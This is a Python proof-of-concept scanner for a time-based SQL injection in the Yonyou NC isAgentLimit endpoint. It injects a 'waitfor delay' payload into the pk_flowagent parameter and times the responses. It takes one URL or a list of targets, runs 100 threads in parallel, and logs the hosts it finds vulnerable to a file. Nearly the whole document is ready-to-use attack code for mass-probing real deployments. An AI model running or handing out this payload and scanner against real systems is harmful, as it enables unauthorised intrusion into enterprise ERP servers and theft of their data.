#用友NC-oacoSchedulerEvents(isAgentLimit存在SQL注入漏洞
import requests,argparse,sys
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()
GREEN = '\033[92m'
RESET = '\033[0m'

def banner():
    test = """
 
  ____   ___  _       _        _           _   _             
 / ___| / _ \| |     (_)_ __  (_) ___  ___| |_(_) ___  _ __  
 \___ \| | | | |     | | '_ \ | |/ _ \/ __| __| |/ _ \| '_ \ 
  ___) | |_| | |___  | | | | || |  __/ (__| |_| | (_) | | | |
 |____/ \__\_\_____| |_|_| |_|/ |\___|\___|\__|_|\___/|_| |_|
                            |__/                             
                                                        version:YongyouNC_oacoSchedulerEvents_slepSql 1.0.0
                                                        Author: Laow🚦                                       
"""
    print(test)

def main():
    banner() 
    parser = argparse.ArgumentParser(description="用友NC-oacoSchedulerEvents/isAgentLimit存在SQL注入漏洞")
    parser.add_argument('-u','--url',dest='url',type=str,help='input link')
    parser.add_argument('-f','--file',dest='file',type=str,help='file path')
    args = parser.parse_args()

    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list = []
        with open(args.file,'r',encoding='utf-8') as fp:
            for i in fp.readlines():
                url_list.append(i.strip().replace('\n',''))
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")


def poc(target):
    url_payload = '/portal/pt/oacoSchedulerEvents/isAgentLimit?pageId=login&pk_flowagent=1%27waitfor+delay+%270:0:5%27--'
    url = target+url_payload
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0", 
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8", 
        "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
        "Accept-Encoding": "gzip, deflate", 
        "Connection": "close", 
        "Upgrade-Insecure-Requests": "1", 
        "Priority": "u=1"
        }
    proxies = {
        'http':'http://127.0.0.1:8080',
        'https':'http://127.0.0.1:8080'
    }
    try:
        res = requests.get(url=url,headers=headers,proxies=proxies,verify=False)
        time = str(res.elapsed.total_seconds())[0]
        print(time)
        if res.status_code == 200:
            if '4' < time <'6':
                print(f"{GREEN}[+] {url} 存在sql延时注入漏洞！{RESET}")
                with open('result.txt','a') as f:
                    f.write(target+'\n')
            else:
                print('漏洞不存在!!')
    except Exception:
        pass
        

if __name__ == '__main__': # 主函数的入口
    main() # 入口 mian()
